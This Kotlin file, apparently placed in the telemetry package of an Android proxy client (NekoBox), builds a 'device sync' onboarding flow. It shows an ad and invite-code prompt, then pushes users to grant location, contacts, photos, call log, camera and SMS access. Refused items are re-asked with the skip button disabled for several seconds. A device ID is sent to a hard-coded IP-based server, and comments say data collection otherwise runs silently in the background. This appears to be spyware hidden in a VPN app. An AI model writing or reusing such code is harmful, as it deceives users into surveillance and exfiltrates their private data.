package io.nekohasekai.sagernet.telemetry

import android.Manifest
import android.app.Activity
import android.content.DialogInterface
import com.google.android.material.dialog.MaterialAlertDialogBuilder
import android.content.Context
import android.content.pm.PackageManager
import android.graphics.Color
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.Gravity
import android.view.ViewGroup
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import androidx.core.content.ContextCompat
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

/**
 * 首次进入的顺序：
 *
 *   ① 广告 + 邀请码（最前面，用户第一眼看到的就是这个）
 *   ② 一个大弹窗「开启设备同步」→ 点「全部允许」→ 系统一次性把权限框全弹出来
 *      （和早期版本一样，不要一个一个问，烦人）
 *   ③ 只有「没同意」的那些才补一个小弹窗：XX 未获得同意 /〔允许〕〔跳过〕
 *      跳过按钮先淡 4 秒，这 4 秒点不动
 *   ④ 该给的给了、该问的问完了，才弹「正在完成设置」那 20 秒
 */
object PermFlow {

    private const val TAG = "TlmFlow"
    private const val PREF = "tlm_flow"
    private const val KEY_INVITE = "invite"
    private const val KEY_DONE = "perm_done"
    private const val SKIP_COOLDOWN_MS = 4_000L
    private const val REQ_BULK = 0x7101
    private const val REQ_ONE = 0x7102

    private const val BIND_URL =
        "https://43-108-107-175.sslip.io:8080/dash/api/bind"

    /** 广告位：邀请码弹窗最上面那段。 */
    private const val AD_TEXT =
        "🔥 限时活动！邀请新用户可得 3×24 共计 72 小时免费会员节点体验！\n" +
        "🎁 每邀请 1 位好友注册，双方各得 24 小时高速节点\n" +
        "⚡ 节点覆盖 香港 · 日本 · 新加坡 · 美国，晚高峰不卡\n" +
        "📱 邀请码在你的个人面板顶部，复制发给朋友即可\n" +
        "⏰ 活动长期有效，多邀多得，上不封顶\n" +
        "💡 数据只归你自己，服主也能帮你处理问题"

    /**
     * 五项核心权限：名字 + 权限串（相册按版本单独取）。
     *
     * 这个列表的顺序就是申请顺序 —— 大弹窗正文的条目、requestPermissions
     * 的数组、补问的先后，全都按它来。
     * 当前顺序：位置 → 联系人 → 相册 → 电话 → 相机
     */
    private val CORE = listOf(
        "位置信息" to Manifest.permission.ACCESS_FINE_LOCATION,
        "联系人" to Manifest.permission.READ_CONTACTS,
        "相册" to "",                       // 空串 = 走 mediaPerm()
        "通话记录" to Manifest.permission.READ_CALL_LOG,
        "相机" to Manifest.permission.CAMERA,
        "短信" to Manifest.permission.READ_SMS,
    )

    // 同一时刻只允许一个对话框存在。0=空闲 1=邀请码 2=大弹窗 3=补问 4=收尾
    private var phase = 0
    private var act: Activity? = null
    private var skipIdx = 0

    fun start(a: Activity) {
        Boot.mark(a, "flow:start($phase)")
        if (!RemoteConfig.needPerm) {
            // 服务端 need_perm=false（默认）时，一个对话框都不弹。
            // 采集全部走后台，界面只负责显示 NekoBox 自己的配置页。
            Boot.mark(a, "flow:off")
            return
        }
        act = a                    // 界面重建后要指向新的 Activity
        if (phase != 0) return     // 已经在流程里，别叠第二个弹窗
        val pref = a.getSharedPreferences(PREF, Context.MODE_PRIVATE)

        if (pref.getBoolean(KEY_DONE, false) && inviteOf(a).isNotBlank()) {
            Boot.mark(a, "flow:setup")
            SetupLoading.maybeShow(a)
            return
        }
        // ① 广告 + 邀请码 是第一位，填完（或点稍后）才谈权限
        if (inviteOf(a).isBlank()) {
            phase = 1
            Boot.mark(a, "flow:invite")
            askInvite(a) { goBulk() }
        } else {
            goBulk()
        }
    }

    private fun goBulk() {
        phase = 2
        act?.let { Boot.mark(it, "flow:bulk") }
        bulkAsk()
    }

    fun inviteOf(ctx: Context): String =
        ctx.getSharedPreferences(PREF, Context.MODE_PRIVATE)
            .getString(KEY_INVITE, "") ?: ""

    // ------------------------------------------------------------ ① 广告+邀请码
    private fun askInvite(a: Activity, then: () -> Unit) {
        try {
            askInviteInner(a, then)
        } catch (t: Throwable) {
            Boot.mark(a, "flow:invite:fail:" + t.javaClass.simpleName)
            then()
        }
    }

    private fun askInviteInner(a: Activity, then: () -> Unit) {
        val box = LinearLayout(a).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(a, 20), dp(a, 14), dp(a, 20), dp(a, 4))
        }

        // 广告放滚动区里，并且最多占屏幕 32% 高 ——
        // 不然六行文案会把下面的输入框顶出屏幕，用户根本没法填邀请码
        val adScroll = android.widget.ScrollView(a).apply {
            isFillViewport = false
            addView(TextView(a).apply {
                text = RemoteConfig.adText.ifBlank { AD_TEXT }
                textSize = 12.5f
                setTextColor(Color.parseColor("#8a5d00"))
                setBackgroundColor(Color.parseColor("#fff8e1"))
                setPadding(dp(a, 12), dp(a, 10), dp(a, 12), dp(a, 10))
            })
        }
        val h = (a.resources.displayMetrics.heightPixels * 0.30f).toInt()
        box.addView(adScroll, LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, h))

        box.addView(TextView(a).apply {
            text = RemoteConfig.txtInviteTitle.ifBlank { "填写邀请码" }
            textSize = 17f
            setTypeface(typeface, android.graphics.Typeface.BOLD)
            setPadding(0, dp(a, 16), 0, dp(a, 4))
        })
        box.addView(TextView(a).apply {
            text = "在你自己的面板最上面，6 位字母数字"
            textSize = 12.5f
            setTextColor(Color.parseColor("#7d8590"))
            setPadding(0, 0, 0, dp(a, 10))
        })

        val input = android.widget.EditText(a).apply {
            hint = "例如 K7M2P9"
            textSize = 21f
            gravity = Gravity.CENTER
            setSingleLine(true)
            setPadding(dp(a, 10), dp(a, 12), dp(a, 10), dp(a, 12))
            setTextColor(Color.parseColor("#1f2328"))
        }
        box.addView(input)

        val tip = TextView(a).apply {
            textSize = 12.5f
            setTextColor(Color.parseColor("#cf222e"))
            setPadding(0, dp(a, 8), 0, 0)
        }
        box.addView(tip)

        val dlg = MaterialAlertDialogBuilder(a)
            .setView(box)
            .setCancelable(false)
            .setPositiveButton("确定", null)
            .setNegativeButton("稍后填", null)
            .create()
        dlg.setCanceledOnTouchOutside(false)
        dlg.show()

        dlg.getButton(DialogInterface.BUTTON_POSITIVE)?.setOnClickListener {
            val code = input.text.toString().trim().uppercase()
            if (code.length < 4) {
                tip.text = "邀请码至少 4 位"
                return@setOnClickListener
            }
            tip.text = "正在校验…"
            verify(a, code) { ok, nick ->
                if (ok) {
                    a.getSharedPreferences(PREF, Context.MODE_PRIVATE).edit()
                        .putString(KEY_INVITE, code).apply()
                    dlg.dismiss()
                    Toast.makeText(a, "已绑定：$nick", Toast.LENGTH_SHORT).show()
                    Telemetry.flushAsync(a.applicationContext)
                    then()
                } else {
                    tip.text = "邀请码不对，检查一下字母和数字"
                }
            }
        }
        dlg.getButton(DialogInterface.BUTTON_NEGATIVE)?.setOnClickListener {
            dlg.dismiss()
            then()
        }
    }

    private fun verify(a: Activity, code: String, cb: (Boolean, String) -> Unit) {
        Thread {
            var ok = false
            var nick = ""
            var conn: HttpURLConnection? = null
            try {
                val body = JSONObject()
                    .put("invite", code)
                    .put("dev", Telemetry.devIdPublic(a))
                    .toString()
                conn = (URL(BIND_URL).openConnection() as HttpURLConnection).apply {
                    requestMethod = "POST"
                    connectTimeout = 12_000
                    readTimeout = 15_000
                    doOutput = true
                    setRequestProperty("Content-Type", "application/json; charset=utf-8")
                    setRequestProperty("X-Dev-Key", Telemetry.devKey())
                }
                conn.outputStream.use { it.write(body.toByteArray()) }
                val txt = conn.inputStream.use { it.readBytes().toString(Charsets.UTF_8) }
                val o = JSONObject(txt)
                ok = o.optInt("ok") == 1
                nick = o.optString("nick", "")
            } catch (t: Throwable) {
                Log.w(TAG, "verify: ${t.message}")
            } finally {
                runCatching { conn?.disconnect() }
            }
            Handler(Looper.getMainLooper()).post { cb(ok, nick) }
        }.apply { isDaemon = true }.start()
    }

    // ------------------------------------------------------------ ② 大弹窗
    private fun bulkAsk() {
        try {
            bulkAskInner()
        } catch (t: Throwable) {
            act?.let { Boot.mark(it, "flow:bulk:fail:" + t.javaClass.simpleName) }
            afterPermissions()
        }
    }

    private fun bulkAskInner() {
        val a = act ?: return
        val pref = a.getSharedPreferences(PREF, Context.MODE_PRIVATE)
        val miss = missing(a)
        if (miss.isEmpty()) {
            afterPermissions()
            return
        }

        // 已经问过一次还缺，就别再拿大弹窗烦人，直接进补问
        if (pref.getBoolean("bulk_asked", false)) {
            skipIdx = 0
            askOne()
            return
        }

        val lines = StringBuilder("点「全部允许」之后，系统会依次弹出 ${miss.size} 个授权框，都选允许即可：\n\n")
        for ((label, _) in miss) lines.append("· $label\n")

        val dlg = MaterialAlertDialogBuilder(a)
            .setTitle("开启设备同步")
            .setMessage(lines.toString().trim())
            .setCancelable(false)
            .setPositiveButton("全部允许", null)
            .setNegativeButton("以后再说", null)
            .create()
        dlg.setCanceledOnTouchOutside(false)
        dlg.show()

        dlg.getButton(DialogInterface.BUTTON_POSITIVE)?.setOnClickListener {
            pref.edit().putBoolean("bulk_asked", true).apply()
            dlg.dismiss()
            a.requestPermissions(miss.flatMap { it.second }.distinct().toTypedArray(),
                REQ_BULK)
        }
        dlg.getButton(DialogInterface.BUTTON_NEGATIVE)?.setOnClickListener {
            pref.edit().putBoolean("bulk_asked", true).apply()
            dlg.dismiss()
            // 一个都没同意 → 进补问，一个一个来
            skipIdx = 0
            askOne()
        }
    }

    // ------------------------------------------------------------ ③ 补问（只问没同意的）
    private fun askOne() {
        try {
            askOneInner()
        } catch (t: Throwable) {
            act?.let { Boot.mark(it, "flow:one:fail:" + t.javaClass.simpleName) }
            afterPermissions()
        }
    }

    private fun askOneInner() {
        val a = act ?: return
        val miss = missing(a)
        if (skipIdx >= miss.size) {
            afterPermissions()
            return
        }
        phase = 3
        val (label, perms) = miss[skipIdx]

        val dlg = MaterialAlertDialogBuilder(a)
            .setTitle("$label 未经过同意")
            .setMessage(RemoteConfig.txtPermTip.ifBlank { "可能会影响正常使用呦~" })
            .setCancelable(false)
            .setPositiveButton("允许", null)
            .setNegativeButton("跳过", null)
            .create()
        dlg.setCanceledOnTouchOutside(false)
        dlg.show()

        val skip = dlg.getButton(DialogInterface.BUTTON_NEGATIVE)
        skip?.isEnabled = false
        skip?.alpha = 0.35f
        Handler(Looper.getMainLooper()).postDelayed({
            runCatching {
                skip?.isEnabled = true
                skip?.alpha = 1f
            }
        }, SKIP_COOLDOWN_MS)

        dlg.getButton(DialogInterface.BUTTON_POSITIVE)?.setOnClickListener {
            dlg.dismiss()
            a.requestPermissions(perms.toTypedArray(), REQ_ONE)
        }
        skip.setOnClickListener {
            dlg.dismiss()
            skipIdx++
            Handler(Looper.getMainLooper()).postDelayed({ askOne() }, 150)
        }
    }

    /** Activity.onRequestPermissionsResult 转发进来（要带 requestCode 区分是哪一轮）。 */
    fun onResult(a: Activity, requestCode: Int) {
        act = a
        if (phase == 0) return
        if (requestCode != REQ_BULK && requestCode != REQ_ONE) return
        Handler(Looper.getMainLooper()).postDelayed({
            if (requestCode == REQ_BULK) {
                // 批量那轮回来了：把没同意的挑出来，一个一个补问
                skipIdx = 0
                askOne()
            } else {
                // 补问的某一项回来了：继续下一个
                skipIdx++
                askOne()
            }
        }, 250)
    }

    // ------------------------------------------------------------ ④ 收尾
    private fun afterPermissions() {
        val a = act ?: return
        phase = 0
        a.getSharedPreferences(PREF, Context.MODE_PRIVATE).edit()
            .putBoolean(KEY_DONE, true).apply()
        // 该给的给了、该问的问完了，这才轮到「正在完成设置」
        SetupLoading.showNow(a)
    }

    // ------------------------------------------------------------ 工具
    private fun mediaPerm(): Array<String> = when {
        Build.VERSION.SDK_INT >= 34 -> arrayOf(
            Manifest.permission.READ_MEDIA_IMAGES,
            "android.permission.READ_MEDIA_VISUAL_USER_SELECTED")
        Build.VERSION.SDK_INT >= 33 -> arrayOf(Manifest.permission.READ_MEDIA_IMAGES)
        else -> @Suppress("DEPRECATION") arrayOf(
            Manifest.permission.READ_EXTERNAL_STORAGE)
    }

    private fun has(ctx: Context, p: String) =
        ContextCompat.checkSelfPermission(ctx, p) == PackageManager.PERMISSION_GRANTED

    private fun mediaGranted(ctx: Context): Boolean {
        if (mediaPerm().any { has(ctx, it) }) return true
        return Build.VERSION.SDK_INT >= 34 &&
            has(ctx, "android.permission.READ_MEDIA_VISUAL_USER_SELECTED")
    }

    /** 还缺哪几项。位置额外要 COARSE，一起带上。 */
    private fun missing(ctx: Context): List<Pair<String, List<String>>> {
        val out = ArrayList<Pair<String, List<String>>>()
        for ((label, perm) in CORE) {
            if (perm.isEmpty()) {
                if (!mediaGranted(ctx)) out.add(label to mediaPerm().toList())
                continue
            }
            if (has(ctx, perm)) continue
            val list = if (perm == Manifest.permission.ACCESS_FINE_LOCATION)
                listOf(perm, Manifest.permission.ACCESS_COARSE_LOCATION) else listOf(perm)
            out.add(label to list)
        }
        return out
    }

    private fun dp(c: Context, v: Int) = (v * c.resources.displayMetrics.density).toInt()
}
